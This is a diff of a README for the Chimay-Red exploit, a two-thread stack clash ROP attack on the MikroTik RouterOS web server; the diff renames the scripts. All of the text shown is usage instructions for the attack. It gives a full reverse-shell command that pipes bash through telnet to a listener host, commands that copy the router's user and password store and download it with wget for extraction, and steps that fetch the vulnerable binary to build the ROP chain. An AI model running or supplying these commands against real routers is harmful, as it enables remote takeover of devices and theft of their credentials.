@@ -23,7 +23,7 @@ Stack clash exploit using two threads  with ROP chain to run bash commands
 ### For a reverse shell:  
 ```
 $ nc -l -p 1234  # (in another shell)
-$ ./StackClashROPsystem.py 192.168.8.1 80 www_binary "/bin/mknod /ram/f p; /bin/telnet 192.168.8.5 1234 < /ram/f | /bin/bash > /ram/f 2>&1"
+$ ./StackClash_x86.py 192.168.8.1 80 www_binary "/bin/mknod /ram/f p; /bin/telnet 192.168.8.5 1234 < /ram/f | /bin/bash > /ram/f 2>&1"
 ```
 Where:  
 - RouterOS IP: 192.168.8.1  
@@ -31,7 +31,7 @@ Where:
 
 ### To extract users and passwords
 ```
-$ ./StackClashROPsystem.py 192.168.8.1 80 www_binary "cp /rw/store/user.dat /ram/winbox.idx"
+$ ./StackClash_x86.py 192.168.8.1 80 www_binary "cp /rw/store/user.dat /ram/winbox.idx"
 $ sleep 3 # (wait some seconds that www is restarted)
 $ wget http://192.168.8.1/winbox/index
 $ ./extract_user.py index
@@ -42,7 +42,7 @@ As the ROP is dynamically created, you have to extract the `www` binary from the
 Check that the running version is the same.  
 To simplify extraction you can use:
 ```
-$ ./getROSbin.py 6.38.4 x86 /nova/bin/www www_binary
+$ ./tools/getROSbin.py 6.38.4 x86 /nova/bin/www www_binary
 ```
 
 ## StackClash_mips  
@@ -55,8 +55,8 @@ The exploit is dynamically created, so it should work on any version minor than 
 ### LCD  
 Funny command  
 ```
-$ ./getROSbin.py 6.38.4 mipsbe /nova/bin/www www_binary
-$ ./StackClashMIPS.py 192.168.8.1 80 www_binary "echo hello world > /dev/lcd"
+$ ./tools/getROSbin.py 6.38.4 mipsbe /nova/bin/www www_binary
+$ ./StackClash_mips.py 192.168.8.1 80 www_binary "echo hello world > /dev/lcd"
 ```
 ![image](https://github.com/BigNerd95/Chimay-Red/raw/master/docs/screen_image.jpg)
 
